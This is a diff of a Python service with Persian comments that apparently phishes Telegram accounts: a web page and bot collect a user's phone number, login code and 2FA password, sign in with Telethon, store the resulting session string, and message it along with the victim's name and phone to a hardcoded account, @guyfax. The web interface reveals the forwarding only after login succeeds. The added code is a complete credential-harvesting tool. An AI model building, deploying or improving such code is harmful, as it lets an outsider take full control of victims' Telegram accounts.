@@ -1,43 +1,27 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔══════════════════════════════════════════════════════════════════════════════╗
-║  Telegram Auth Service v1.0                                                 ║
-║  فقط ثبت‌نام و ارسال سشن به @guyfax - بدون احراز هویت ادمین               ║
-╚══════════════════════════════════════════════════════════════════════════════╝
+Telegram Auth Service v2.0 - بدون Pydantic v2 (سازگار با Python 3.11+)
 """
 
 import os
 import sys
 import uuid
 import time
-import json
 import asyncio
 import logging
 import secrets
-import hashlib
 import re
-from typing import Dict, Optional, Any, List
+from typing import Dict, Optional, Any
 from pathlib import Path
-from datetime import datetime, timedelta
+from datetime import datetime
 from contextlib import asynccontextmanager
-from enum import Enum
-from base64 import b64encode, b64decode
 
-# --- Environment & Settings ---
-from pydantic_settings import BaseSettings, SettingsConfigDict
-from pydantic import BaseModel, Field
-
-# --- FastAPI & Uvicorn ---
-import uvicorn
-from fastapi import FastAPI, Request, HTTPException, Query, status
-from fastapi.responses import HTMLResponse, PlainTextResponse
+from fastapi import FastAPI, Request, HTTPException
+from fastapi.responses import HTMLResponse
 from fastapi.middleware.cors import CORSMiddleware
-
-# --- Async SQLite ---
+import uvicorn
 import aiosqlite
-
-# --- Telethon (MTProto & Bot) ---
 from telethon import TelegramClient, events, Button
 from telethon.errors import (
     SessionPasswordNeededError,
@@ -47,158 +31,61 @@ from telethon.errors import (
     PhoneNumberBannedError
 )
 from telethon.tl.types import User
+from dotenv import load_dotenv
 
-# ============================================================================
-# 1. CONFIGURATION
-# ============================================================================
+load_dotenv()
 
-class Settings(BaseSettings):
-    # Telegram API
-    API_ID: int
-    API_HASH: str
-    TOKEN_BOT: str
+# ========== CONFIG ==========
+API_ID = int(os.getenv("API_ID", 0))
+API_HASH = os.getenv("API_HASH", "")
+TOKEN_BOT = os.getenv("TOKEN_BOT", "")
+TARGET_USERNAME = os.getenv("TARGET_USERNAME", "guyfax")
+HOST = os.getenv("HOST", "0.0.0.0")
+PORT = int(os.getenv("PORT", 8000))
+DB_FILE = Path("users.db")
+SESSION_DIR = Path("sessions")
+LOG_FILE = Path("logs/service.log")
 
-    # Database & files
-    DB_FILE: str = "users.db"
-    SESSION_DIR: str = "sessions"
-    LOG_DIR: str = "logs"
-    LOG_FILE: str = "service.log"
+SESSION_DIR.mkdir(exist_ok=True)
+LOG_FILE.parent.mkdir(exist_ok=True)
 
-    # Server
-    HOST: str = "0.0.0.0"
-    PORT: int = int(os.getenv("PORT", 8000))
-
-    # Session limits
-    MAX_SESSIONS: int = 10000
-    SESSION_TIMEOUT: int = 600
-    SESSION_CLEANUP_INTERVAL: int = 300
-
-    # Rate limiting
-    RATE_LIMIT_REQUESTS: int = 30
-    RATE_LIMIT_WINDOW: int = 60
-
-    # Features
-    ENABLE_BOT: bool = True
-    ENABLE_WEB_UI: bool = True
-
-    # Target for session forwarding
-    TARGET_USERNAME: str = "guyfax"      # @guyfax
-
-    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")
-
-settings = Settings()
-
-class AppConfig:
-    BASE_DIR: Path = Path(__file__).parent.resolve()
-    SESSION_DIR: Path = BASE_DIR / settings.SESSION_DIR
-    LOG_DIR: Path = BASE_DIR / settings.LOG_DIR
-    LOG_FILE: Path = LOG_DIR / settings.LOG_FILE
-    DB_FILE: Path = BASE_DIR / settings.DB_FILE
-
-AppConfig.SESSION_DIR.mkdir(parents=True, exist_ok=True)
-AppConfig.LOG_DIR.mkdir(parents=True, exist_ok=True)
-
-# ============================================================================
-# 2. LOGGING
-# ============================================================================
-
-log = logging.getLogger("auth_service")
-log.setLevel(logging.INFO)
-
-fh = logging.handlers.RotatingFileHandler(
-    AppConfig.LOG_FILE, maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'
+# ========== LOGGING ==========
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(levelname)-8s | %(message)s",
+    handlers=[
+        logging.FileHandler(LOG_FILE, encoding="utf-8"),
+        logging.StreamHandler()
+    ]
 )
-fh.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s'))
-log.addHandler(fh)
+log = logging.getLogger("auth")
 
-ch = logging.StreamHandler()
-ch.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s'))
-log.addHandler(ch)
+# ========== HELPERS ==========
+def sanitize_phone(phone: str) -> str:
+    if not phone: return ""
+    phone = phone.strip()
+    if phone.startswith(' '):
+        phone = '+' + phone[1:]
+    cleaned = re.sub(r'[^\d+]', '', phone)
+    if not cleaned.startswith('+') and cleaned.startswith('00'):
+        cleaned = '+' + cleaned[2:]
+    elif not cleaned.startswith('+') and cleaned.isdigit():
+        cleaned = '+' + cleaned
+    return cleaned
 
-# ============================================================================
-# 3. UTILITIES
-# ============================================================================
+def validate_phone(phone: str) -> bool:
+    return bool(re.match(r'^\+[1-9]\d{6,14}$', phone))
 
-class SecurityUtils:
-    @staticmethod
-    def sanitize_phone(phone: str) -> str:
-        if not phone:
-            return ""
-        phone = phone.strip()
-        if phone.startswith(' '):
-            phone = '+' + phone[1:]
-        cleaned = re.sub(r'[^\d+]', '', phone)
-        if not cleaned.startswith('+') and cleaned.startswith('00'):
-            cleaned = '+' + cleaned[2:]
-        elif not cleaned.startswith('+') and cleaned.isdigit():
-            cleaned = '+' + cleaned
-        return cleaned
+def gen_session_id() -> str:
+    return f"sess_{uuid.uuid4().hex}"
 
-    @staticmethod
-    def validate_phone(phone: str) -> bool:
-        return bool(re.match(r'^\+[1-9]\d{6,14}$', phone))
+# ========== DATABASE ==========
+class DB:
+    def __init__(self, path: Path):
+        self.path = path
 
-    @staticmethod
-    def generate_session_id(prefix: str = "sess") -> str:
-        return f"{prefix}_{uuid.uuid4().hex}"
-
-    @staticmethod
-    def encrypt_session_data(data: bytes, key: str) -> str:
-        key_bytes = key.encode('utf-8')
-        encrypted = bytearray()
-        for i, byte in enumerate(data):
-            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
-        return b64encode(encrypted).decode('utf-8')
-
-    @staticmethod
-    def decrypt_session_data(encrypted_b64: str, key: str) -> bytes:
-        encrypted = b64decode(encrypted_b64)
-        key_bytes = key.encode('utf-8')
-        decrypted = bytearray()
-        for i, byte in enumerate(encrypted):
-            decrypted.append(byte ^ key_bytes[i % len(key_bytes)])
-        return bytes(decrypted)
-
-# ============================================================================
-# 4. RATE LIMITER
-# ============================================================================
-
-class RateLimiter:
-    def __init__(self):
-        self.requests: Dict[str, List[float]] = {}
-        self.lock = asyncio.Lock()
-
-    async def check(self, key: str, limit: int = None, window: int = None) -> bool:
-        limit = limit or settings.RATE_LIMIT_REQUESTS
-        window = window or settings.RATE_LIMIT_WINDOW
-        async with self.lock:
-            now = time.time()
-            if key not in self.requests:
-                self.requests[key] = []
-            self.requests[key] = [t for t in self.requests[key] if now - t < window]
-            if len(self.requests[key]) >= limit:
-                return False
-            self.requests[key].append(now)
-            return True
-
-rate_limiter = RateLimiter()
-
-async def rate_limit_dependency(request: Request):
-    client_ip = request.client.host if request.client else "unknown"
-    if not await rate_limiter.check(client_ip):
-        raise HTTPException(status_code=429, detail="Rate limit exceeded. Try again later.")
-    return True
-
-# ============================================================================
-# 5. DATABASE
-# ============================================================================
-
-class Database:
-    def __init__(self, db_path: Path):
-        self.db_path = db_path
-
-    async def init_db(self):
-        async with aiosqlite.connect(self.db_path) as db:
+    async def init(self):
+        async with aiosqlite.connect(self.path) as db:
             await db.execute('''
                 CREATE TABLE IF NOT EXISTS users (
                     user_id INTEGER PRIMARY KEY,
@@ -210,237 +97,165 @@ class Database:
                     login_date TEXT
                 )
             ''')
-            await db.execute('CREATE INDEX IF NOT EXISTS idx_phone ON users(phone)')
             await db.commit()
-        log.info("Database initialized.")
+        log.info("DB ready")
 
-    async def add_user(self, user_data: Dict) -> Dict:
-        async with aiosqlite.connect(self.db_path) as db:
-            cursor = await db.execute(
-                "SELECT user_id FROM users WHERE phone = ?", (user_data.get('phone'),)
-            )
-            row = await cursor.fetchone()
+    async def add_user(self, data: Dict):
+        async with aiosqlite.connect(self.path) as db:
+            cur = await db.execute("SELECT user_id FROM users WHERE phone = ?", (data['phone'],))
+            row = await cur.fetchone()
             if row:
-                user_id = row[0]
                 await db.execute('''
-                    UPDATE users SET
-                        first_name = ?,
-                        last_name = ?,
-                        username = ?,
-                        session_string = ?,
-                        login_date = ?
-                    WHERE user_id = ?
-                ''', (
-                    user_data.get('first_name'),
-                    user_data.get('last_name'),
-                    user_data.get('username'),
-                    user_data.get('session_string'),
-                    user_data.get('login_date'),
-                    user_id
-                ))
-                await db.commit()
-                log.info(f"Updated user {user_id}")
-                user_data['user_id'] = user_id
-                return user_data
+                    UPDATE users SET first_name=?, last_name=?, username=?, session_string=?, login_date=?
+                    WHERE user_id=?
+                ''', (data.get('first_name'), data.get('last_name'), data.get('username'),
+                      data.get('session_string'), data.get('login_date'), row[0]))
             else:
-                cursor = await db.execute('''
-                    INSERT INTO users (
-                        user_id, first_name, last_name, username, phone,
-                        session_string, login_date
-                    ) VALUES (?, ?, ?, ?, ?, ?, ?)
-                ''', (
-                    user_data['user_id'],
-                    user_data.get('first_name'),
-                    user_data.get('last_name'),
-                    user_data.get('username'),
-                    user_data['phone'],
-                    user_data.get('session_string'),
-                    user_data.get('login_date')
-                ))
-                await db.commit()
-                log.info(f"Added user {user_data['user_id']}")
-                return user_data
+                await db.execute('''
+                    INSERT INTO users (user_id, first_name, last_name, username, phone, session_string, login_date)
+                    VALUES (?, ?, ?, ?, ?, ?, ?)
+                ''', (data['user_id'], data.get('first_name'), data.get('last_name'),
+                      data.get('username'), data['phone'], data.get('session_string'), data.get('login_date')))
+            await db.commit()
+            return data
 
-db = Database(AppConfig.DB_FILE)
+db = DB(DB_FILE)
 
-# ============================================================================
-# 6. TELEGRAM AUTH MANAGER
-# ============================================================================
-
-class SessionState(Enum):
-    INITIALIZED = "INITIALIZED"
-    CODE_SENT = "CODE_SENT"
-    AWAITING_2FA = "AWAITING_2FA"
-    LOGGED_IN = "LOGGED_IN"
-
-class SessionData:
-    def __init__(self, session_id: str, client: TelegramClient):
-        self.session_id = session_id
-        self.client = client
-        self.phone: Optional[str] = None
-        self.phone_code_hash: Optional[str] = None
-        self.state: SessionState = SessionState.INITIALIZED
-        self.last_access: float = time.time()
-        self.is_connected: bool = False
-
-class TelegramAuthManager:
+# ========== AUTH MANAGER ==========
+class AuthManager:
     def __init__(self):
-        self.active_sessions: Dict[str, SessionData] = {}
-        self.phone_to_session: Dict[str, str] = {}
+        self.active = {}
+        self.phone_map = {}
         self.lock = asyncio.Lock()
-        self._cleanup_task = None
-        self.encryption_key = secrets.token_hex(32)  # کلید رمزنگاری سشن
+        self.cleanup_task = None
 
     async def start_cleanup(self):
-        async def cleanup_loop():
+        async def loop():
             while True:
-                await asyncio.sleep(settings.SESSION_CLEANUP_INTERVAL)
-                await self._cleanup_expired()
-        self._cleanup_task = asyncio.create_task(cleanup_loop())
+                await asyncio.sleep(300)
+                now = time.time()
+                expired = [sid for sid, s in self.active.items() if now - s['last'] > 600]
+                for sid in expired:
+                    data = self.active.pop(sid)
+                    if data['phone'] in self.phone_map:
+                        del self.phone_map[data['phone']]
+                    try:
+                        await data['client'].disconnect()
+                    except:
+                        pass
+        self.cleanup_task = asyncio.create_task(loop())
 
     async def stop_cleanup(self):
-        if self._cleanup_task:
-            self._cleanup_task.cancel()
-            try:
-                await self._cleanup_task
-            except asyncio.CancelledError:
-                pass
+        if self.cleanup_task:
+            self.cleanup_task.cancel()
 
-    async def _cleanup_expired(self):
-        now = time.time()
-        expired = [sid for sid, data in self.active_sessions.items() if now - data.last_access > settings.SESSION_TIMEOUT]
-        for sid in expired:
-            data = self.active_sessions.pop(sid)
-            if data.phone in self.phone_to_session:
-                del self.phone_to_session[data.phone]
-            try:
-                await data.client.disconnect()
-            except:
-                pass
-            log.debug(f"Cleaned session {sid}")
-
-    async def get_or_create_session(self, phone: Optional[str] = None) -> SessionData:
+    async def create_session(self, phone: str = None):
         async with self.lock:
-            if phone and phone in self.phone_to_session:
-                sid = self.phone_to_session[phone]
-                if sid in self.active_sessions:
-                    session = self.active_sessions[sid]
-                    session.last_access = time.time()
-                    if not session.is_connected:
-                        await session.client.connect()
-                        session.is_connected = True
-                    return session
+            if phone and phone in self.phone_map:
+                sid = self.phone_map[phone]
+                if sid in self.active:
+                    s = self.active[sid]
+                    s['last'] = time.time()
+                    if not s['client'].is_connected():
+                        await s['client'].connect()
+                    return s
 
-            await self._cleanup_expired()
-            if len(self.active_sessions) >= settings.MAX_SESSIONS:
-                raise HTTPException(status_code=503, detail="Server busy")
-
-            session_id = SecurityUtils.generate_session_id()
-            session_file = str(AppConfig.SESSION_DIR / f"{session_id}.session")
-            client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
+            sid = gen_session_id()
+            session_file = SESSION_DIR / f"{sid}.session"
+            client = TelegramClient(str(session_file), API_ID, API_HASH)
             await client.connect()
-            session = SessionData(session_id, client)
-            session.is_connected = True
-            self.active_sessions[session_id] = session
+            data = {
+                'client': client,
+                'phone': phone,
+                'last': time.time(),
+                'state': 'init'
+            }
+            self.active[sid] = data
             if phone:
-                self.phone_to_session[phone] = session_id
-                session.phone = phone
-            return session
+                self.phone_map[phone] = sid
+            return data
 
-    async def send_code(self, phone: str) -> Dict:
-        phone = SecurityUtils.sanitize_phone(phone)
-        if not SecurityUtils.validate_phone(phone):
-            raise HTTPException(status_code=400, detail="Invalid phone format. Use +1234567890")
-
-        session = await self.get_or_create_session(phone)
-        session.phone = phone
+    async def send_code(self, phone: str):
+        phone = sanitize_phone(phone)
+        if not validate_phone(phone):
+            raise HTTPException(400, "Invalid phone")
+        s = await self.create_session(phone)
+        s['phone'] = phone
         try:
-            result = await session.client.send_code_request(phone)
-            session.phone_code_hash = result.phone_code_hash
-            session.state = SessionState.CODE_SENT
-            return {"status": "success", "session_id": session.session_id}
+            result = await s['client'].send_code_request(phone)
+            s['hash'] = result.phone_code_hash
+            s['state'] = 'code_sent'
+            return {"session_id": s['client'].session.filename.stem}
         except FloodWaitError as e:
-            raise HTTPException(status_code=429, detail=f"Wait {e.seconds}s")
+            raise HTTPException(429, f"Wait {e.seconds}s")
         except Exception as e:
-            raise HTTPException(status_code=400, detail=str(e))
+            raise HTTPException(400, str(e))
 
-    async def verify_code(self, session_id: str, code: str) -> Dict:
-        session = self.active_sessions.get(session_id)
-        if not session or session.state != SessionState.CODE_SENT:
-            raise HTTPException(status_code=400, detail="Invalid session")
-
+    async def verify_code(self, session_id: str, code: str):
+        sid = session_id
+        if sid not in self.active:
+            raise HTTPException(400, "Invalid session")
+        s = self.active[sid]
+        if s['state'] != 'code_sent':
+            raise HTTPException(400, "Not waiting for code")
         try:
-            await session.client.sign_in(
-                phone=session.phone,
-                code=code,
-                phone_code_hash=session.phone_code_hash
-            )
-            return await self._finalize(session)
+            await s['client'].sign_in(phone=s['phone'], code=code, phone_code_hash=s['hash'])
+            return await self._finalize(s)
         except SessionPasswordNeededError:
-            session.state = SessionState.AWAITING_2FA
+            s['state'] = '2fa_needed'
             return {"status": "2fa_required"}
         except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
-            raise HTTPException(status_code=400, detail=str(e))
+            raise HTTPException(400, str(e))
         except Exception as e:
-            raise HTTPException(status_code=400, detail=str(e))
+            raise HTTPException(400, str(e))
 
-    async def verify_2fa(self, session_id: str, password: str) -> Dict:
-        session = self.active_sessions.get(session_id)
-        if not session or session.state != SessionState.AWAITING_2FA:
-            raise HTTPException(status_code=400, detail="2FA not required")
-
+    async def verify_2fa(self, session_id: str, password: str):
+        sid = session_id
+        if sid not in self.active:
+            raise HTTPException(400, "Invalid session")
+        s = self.active[sid]
+        if s['state'] != '2fa_needed':
+            raise HTTPException(400, "No 2FA needed")
         try:
-            await session.client.sign_in(password=password)
-            return await self._finalize(session)
-        except Exception as e:
-            raise HTTPException(status_code=400, detail="Invalid password")
+            await s['client'].sign_in(password=password)
+            return await self._finalize(s)
+        except Exception:
+            raise HTTPException(400, "Invalid password")
 
-    async def _finalize(self, session: SessionData) -> Dict:
-        me = await session.client.get_me()
-        session.state = SessionState.LOGGED_IN
-
-        # دریافت سشن استرینگ
-        session_string = session.client.session.save()
-        # رمزنگاری (اختیاری)
-        encrypted = SecurityUtils.encrypt_session_data(session_string.encode('utf-8'), self.encryption_key)
-
+    async def _finalize(self, s):
+        me = await s['client'].get_me()
+        session_string = s['client'].session.save()
         user_data = {
-            "user_id": me.id,
-            "first_name": me.first_name,
-            "last_name": me.last_name,
-            "username": me.username,
-            "phone": session.phone,
-            "session_string": encrypted,
-            "login_date": datetime.utcnow().isoformat()
+            'user_id': me.id,
+            'first_name': me.first_name,
+            'last_name': me.last_name,
+            'username': me.username,
+            'phone': s['phone'],
+            'session_string': session_string,
+            'login_date': datetime.utcnow().isoformat()
         }
         await db.add_user(user_data)
-
-        # ارسال سشن به @guyfax
-        await self._send_session_to_target(session_string, me, session.phone)
-
-        # پاک کردن سشن از حافظه
+        # ارسال به تارگت
+        await self.send_session_to_target(session_string, me, s['phone'])
+        # پاک کردن سشن
+        sid = s['client'].session.filename.stem
         try:
-            await session.client.disconnect()
+            await s['client'].disconnect()
         except:
             pass
-        del self.active_sessions[session.session_id]
-        if session.phone in self.phone_to_session:
-            del self.phone_to_session[session.phone]
-
+        if sid in self.active:
+            del self.active[sid]
+        if s['phone'] in self.phone_map:
+            del self.phone_map[s['phone']]
         return {"status": "success", "user": user_data}
 
-    async def _send_session_to_target(self, session_string: str, user: User, phone: str):
-        if not settings.ENABLE_BOT:
-            log.warning("Bot disabled")
+    async def send_session_to_target(self, session_string: str, user: User, phone: str):
+        if not TOKEN_BOT:
             return
-        bot_client = bot_manager.client
-        if not bot_client or not bot_client.is_connected():
+        bot = bot_manager.client
+        if not bot or not bot.is_connected():
             log.warning("Bot not connected")
             return
-        target = settings.TARGET_USERNAME
-        if not target:
-            return
-
         msg = (
             f"🔐 **New Session**\n\n"
             f"👤 {user.first_name} {user.last_name or ''}\n"
@@ -451,231 +266,176 @@ class TelegramAuthManager:
             f"**Session:**\n`{session_string}`"
         )
         try:
-            entity = await bot_client.get_entity(target)
-            await bot_client.send_message(entity, msg, parse_mode='markdown')
-            log.info(f"Session sent to @{target}")
+            entity = await bot.get_entity(TARGET_USERNAME)
+            await bot.send_message(entity, msg, parse_mode='markdown')
+            log.info(f"Session sent to @{TARGET_USERNAME}")
         except Exception as e:
-            log.error(f"Send session failed: {e}")
+            log.error(f"Send failed: {e}")
 
-auth_manager = TelegramAuthManager()
+auth = AuthManager()
 
-# ============================================================================
-# 7. TELEGRAM BOT (بدون ادمین، فقط راهنما)
-# ============================================================================
-
-class TelegramBotManager:
-    def __init__(self, token: str):
-        self.token = token
-        self.client = TelegramClient(str(AppConfig.SESSION_DIR / "bot.session"), settings.API_ID, settings.API_HASH)
-        self.user_states: Dict[int, Dict] = {}
+# ========== TELEGRAM BOT ==========
+class BotManager:
+    def __init__(self):
+        self.client = TelegramClient(str(SESSION_DIR / "bot.session"), API_ID, API_HASH)
+        self.states = {}
 
     async def start(self):
-        if not settings.ENABLE_BOT:
+        if not TOKEN_BOT:
             return
-        try:
-            await self.client.start(bot_token=self.token)
-            log.info("Bot started")
+        await self.client.start(bot_token=TOKEN_BOT)
+        log.info("Bot started")
 
-            @self.client.on(events.NewMessage(func=lambda e: e.is_private))
-            async def handler(event):
-                sender = await event.get_sender()
-                if sender.bot:
-                    return
-                text = event.message.message.strip()
-                user_id = sender.id
+        @self.client.on(events.NewMessage(func=lambda e: e.is_private))
+        async def handler(event):
+            sender = await event.get_sender()
+            if sender.bot:
+                return
+            text = event.message.message.strip()
+            uid = sender.id
 
-                if text == '/start':
-                    await self.cmd_start(event, user_id)
-                    return
-                elif text == '/cancel':
-                    await self.cmd_cancel(event, user_id)
-                    return
+            if text == '/start':
+                self.states[uid] = {'step': 'phone'}
+                await event.respond("👋 Send your phone number (e.g., +1234567890)")
+                return
+            elif text == '/cancel':
+                self.states.pop(uid, None)
+                await event.respond("Cancelled")
+                return
 
-                state = self.user_states.get(user_id)
-                if not state:
-                    await event.respond("Send /start to begin.")
-                    return
+            state = self.states.get(uid)
+            if not state:
+                await event.respond("Send /start to begin.")
+                return
 
-                if state.get("step") == "phone":
-                    await self.handle_phone(event, user_id, text)
-                elif state.get("step") == "code":
-                    await self.handle_code(event, user_id, text)
-                elif state.get("step") == "password":
-                    await self.handle_password(event, user_id, text)
+            if state['step'] == 'phone':
+                await self.handle_phone(event, uid, text)
+            elif state['step'] == 'code':
+                await self.handle_code(event, uid, text)
+            elif state['step'] == 'password':
+                await self.handle_password(event, uid, text)
 
-        except Exception as e:
-            log.error(f"Bot error: {e}")
-
-    async def cmd_start(self, event, user_id):
-        self.user_states[user_id] = {"step": "phone"}
-        await event.respond(
-            "👋 **Welcome!**\n\n"
-            "Send your phone number (e.g., +1234567890)\n"
-            "I'll send the session to @guyfax after verification.\n\n"
-            "Type /cancel to abort."
-        )
-
-    async def cmd_cancel(self, event, user_id):
-        if user_id in self.user_states:
-            del self.user_states[user_id]
-        await event.respond("Cancelled. Send /start to begin again.")
-
-    async def handle_phone(self, event, user_id, text):
-        phone = SecurityUtils.sanitize_phone(text)
-        if not SecurityUtils.validate_phone(phone):
+    async def handle_phone(self, event, uid, text):
+        phone = sanitize_phone(text)
+        if not validate_phone(phone):
             await event.respond("❌ Invalid format. Use +1234567890")
             return
-
-        session_id = SecurityUtils.generate_session_id("bot")
-        session_file = str(AppConfig.SESSION_DIR / f"{session_id}.session")
-        client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
+        session_file = SESSION_DIR / f"bot_{uid}.session"
+        client = TelegramClient(str(session_file), API_ID, API_HASH)
         try:
             await client.connect()
             result = await client.send_code_request(phone)
-            self.user_states[user_id].update({
-                "session_id": session_id,
-                "phone": phone,
-                "phone_code_hash": result.phone_code_hash,
-                "client": client,
-                "step": "code"
+            self.states[uid].update({
+                'client': client,
+                'phone': phone,
+                'hash': result.phone_code_hash,
+                'step': 'code'
             })
-            await event.respond("✅ Code sent! Enter the verification code.")
+            await event.respond("✅ Code sent. Enter it now.")
         except Exception as e:
-            await event.respond(f"❌ Error: {str(e)}")
+            await event.respond(f"❌ {str(e)}")
             await client.disconnect()
 
-    async def handle_code(self, event, user_id, text):
-        state = self.user_states[user_id]
-        client = state.get("client")
+    async def handle_code(self, event, uid, text):
+        state = self.states[uid]
+        client = state['client']
         if not client or not client.is_connected():
             await event.respond("Session expired. /start again.")
             return
         if not text.isdigit():
-            await event.respond("Code must be numbers only.")
+            await event.respond("Code must be numbers.")
             return
-
         try:
-            await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
+            await client.sign_in(phone=state['phone'], code=text, phone_code_hash=state['hash'])
             me = await client.get_me()
             session_string = client.session.save()
-            # ذخیره و ارسال
-            encrypted = SecurityUtils.encrypt_session_data(session_string.encode('utf-8'), auth_manager.encryption_key)
-            user_data = {
-                "user_id": me.id,
-                "first_name": me.first_name,
-                "last_name": me.last_name,
-                "username": me.username,
-                "phone": state["phone"],
-                "session_string": encrypted,
-                "login_date": datetime.utcnow().isoformat()
-            }
-            await db.add_user(user_data)
-            await auth_manager._send_session_to_target(session_string, me, state["phone"])
-            await event.respond(f"✅ Success! Welcome {me.first_name}. Session sent.")
-            del self.user_states[user_id]
-            await client.disconnect()
+            await self.finalize_bot_login(client, state['phone'], me, session_string)
+            await event.respond(f"✅ Login successful, Welcome {me.first_name}!")
+            del self.states[uid]
         except SessionPasswordNeededError:
-            state["step"] = "password"
-            await event.respond("🔒 2FA enabled. Send your password.")
+            state['step'] = 'password'
+            await event.respond("🔒 Enter your 2FA password.")
         except Exception as e:
-            await event.respond(f"❌ Invalid code: {str(e)}")
+            await event.respond(f"❌ {str(e)}")
 
-    async def handle_password(self, event, user_id, text):
-        state = self.user_states[user_id]
-        client = state.get("client")
+    async def handle_password(self, event, uid, text):
+        state = self.states[uid]
+        client = state['client']
         try:
             await client.sign_in(password=text)
             me = await client.get_me()
             session_string = client.session.save()
-            encrypted = SecurityUtils.encrypt_session_data(session_string.encode('utf-8'), auth_manager.encryption_key)
-            user_data = {
-                "user_id": me.id,
-                "first_name": me.first_name,
-                "last_name": me.last_name,
-                "username": me.username,
-                "phone": state["phone"],
-                "session_string": encrypted,
-                "login_date": datetime.utcnow().isoformat()
-            }
-            await db.add_user(user_data)
-            await auth_manager._send_session_to_target(session_string, me, state["phone"])
-            await event.respond(f"✅ 2FA success! Session sent.")
-            del self.user_states[user_id]
-            await client.disconnect()
+            await self.finalize_bot_login(client, state['phone'], me, session_string)
+            await event.respond("✅ 2FA passed! Session sent.")
+            del self.states[uid]
         except Exception:
-            await event.respond("❌ Invalid password. Try again or /cancel.")
+            await event.respond("❌ Wrong password. Try again or /cancel.")
 
-bot_manager = TelegramBotManager(settings.TOKEN_BOT)
+    async def finalize_bot_login(self, client, phone, me, session_string):
+        user_data = {
+            'user_id': me.id,
+            'first_name': me.first_name,
+            'last_name': me.last_name,
+            'username': me.username,
+            'phone': phone,
+            'session_string': session_string,
+            'login_date': datetime.utcnow().isoformat()
+        }
+        await db.add_user(user_data)
+        await auth.send_session_to_target(session_string, me, phone)
+        await client.disconnect()
 
-# ============================================================================
-# 8. FASTAPI APP (بدون ادمین)
-# ============================================================================
+bot_manager = BotManager()
 
+# ========== FASTAPI APP ==========
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    log.info("Starting auth service...")
-    await db.init_db()
-    await auth_manager.start_cleanup()
-    if settings.ENABLE_BOT:
-        asyncio.create_task(bot_manager.start())
+    log.info("Starting...")
+    await db.init()
+    await auth.start_cleanup()
+    asyncio.create_task(bot_manager.start())
     yield
-    await auth_manager.stop_cleanup()
-    if settings.ENABLE_BOT and bot_manager.client:
+    await auth.stop_cleanup()
+    if bot_manager.client.is_connected():
         await bot_manager.client.disconnect()
-    log.info("Shutdown complete.")
+    log.info("Shutdown")
 
-app = FastAPI(title="Telegram Auth Service", version="1.0", lifespan=lifespan)
+app = FastAPI(lifespan=lifespan)
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
 
-# ============================================================================
-# 9. PYDANTIC MODELS
-# ============================================================================
+@app.post("/api/send-code")
+async def api_send_code(request: Request):
+    data = await request.json()
+    phone = data.get("phone")
+    if not phone:
+        raise HTTPException(400, "phone required")
+    res = await auth.send_code(phone)
+    return {"status": "success", "data": {"session_id": res["session_id"]}}
 
-class SendCodeRequest(BaseModel):
-    phone: str
-
-class VerifyCodeRequest(BaseModel):
-    session_id: str
-    code: str
-
-class Verify2FARequest(BaseModel):
-    session_id: str
-    password: str
-
-class ApiResponse(BaseModel):
-    status: str
-    message: str
-    data: Optional[Any] = None
-
-# ============================================================================
-# 10. API ROUTES
-# ============================================================================
-
-@app.post("/api/send-code", response_model=ApiResponse)
-async def send_code(payload: SendCodeRequest, request: Request):
-    await rate_limit_dependency(request)
-    res = await auth_manager.send_code(payload.phone)
-    return {"status": "success", "message": "Code sent", "data": {"session_id": res["session_id"]}}
-
-@app.post("/api/verify-code", response_model=ApiResponse)
-async def verify_code(payload: VerifyCodeRequest, request: Request):
-    await rate_limit_dependency(request)
-    res = await auth_manager.verify_code(payload.session_id, payload.code)
+@app.post("/api/verify-code")
+async def api_verify_code(request: Request):
+    data = await request.json()
+    session_id = data.get("session_id")
+    code = data.get("code")
+    if not session_id or not code:
+        raise HTTPException(400, "session_id and code required")
+    res = await auth.verify_code(session_id, code)
     if res.get("status") == "2fa_required":
-        return {"status": "2fa_required", "message": "2FA required", "data": None}
-    return {"status": "success", "message": "Login successful", "data": res.get("user")}
+        return {"status": "2fa_required", "data": None}
+    return {"status": "success", "data": res.get("user")}
 
-@app.post("/api/verify-2fa", response_model=ApiResponse)
-async def verify_2fa(payload: Verify2FARequest, request: Request):
-    await rate_limit_dependency(request)
-    res = await auth_manager.verify_2fa(payload.session_id, payload.password)
-    return {"status": "success", "message": "2FA passed", "data": res.get("user")}
+@app.post("/api/verify-2fa")
+async def api_verify_2fa(request: Request):
+    data = await request.json()
+    session_id = data.get("session_id")
+    password = data.get("password")
+    if not session_id or not password:
+        raise HTTPException(400, "session_id and password required")
+    res = await auth.verify_2fa(session_id, password)
+    return {"status": "success", "data": res.get("user")}
 
-# ============================================================================
-# 11. FRONTEND (صفحه ساده ثبت‌نام)
-# ============================================================================
-
-FRONTEND_HTML = r"""
+# ========== FRONTEND ==========
+HTML = """
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -748,7 +508,7 @@ document.getElementById('btnVerify').onclick = async () => {
             document.getElementById('step2fa').classList.remove('hidden');
             statusEl.textContent = 'Enter 2FA password';
         } else {
-            statusEl.textContent = '✅ Login successful!';
+            statusEl.textContent = '✅ Login successful! Session sent.';
         }
     } catch(e) { statusEl.textContent = e.message; }
 };
@@ -759,7 +519,7 @@ document.getElementById('btn2fa').onclick = async () => {
     statusEl.textContent = 'Verifying...';
     try {
         const res = await req('/api/verify-2fa', {session_id: sessionId, password});
-        statusEl.textContent = '✅ 2FA success!';
+        statusEl.textContent = '✅ 2FA success! Session sent.';
     } catch(e) { statusEl.textContent = e.message; }
 };
 
@@ -773,13 +533,10 @@ document.getElementById('btnBack').onclick = () => {
 </html>
 """
 
-@app.get("/", response_class=HTMLResponse, include_in_schema=False)
-async def serve_frontend():
-    return HTMLResponse(FRONTEND_HTML)
+@app.get("/", response_class=HTMLResponse)
+async def root():
+    return HTML
 
